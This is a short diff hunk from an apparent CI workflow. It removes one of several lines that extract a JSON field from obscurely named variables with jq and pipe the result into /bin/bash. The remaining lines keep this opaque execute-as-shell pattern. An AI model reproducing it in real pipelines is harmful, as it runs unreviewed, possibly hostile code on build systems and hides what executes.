@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$gc2" | jq -r .e752 | /bin/bash
           printf '%s' "$ll5147" | jq -r .pylb2 | /bin/bash
           printf '%s' "$v72834" | jq -r .v36 | /bin/bash
-          echo $ngus841 | jq -r .gca60 | /bin/bash
           printf '%s' "$p5" | jq -r .tekxf9718 | /bin/bash
 
       - name: Store artifact
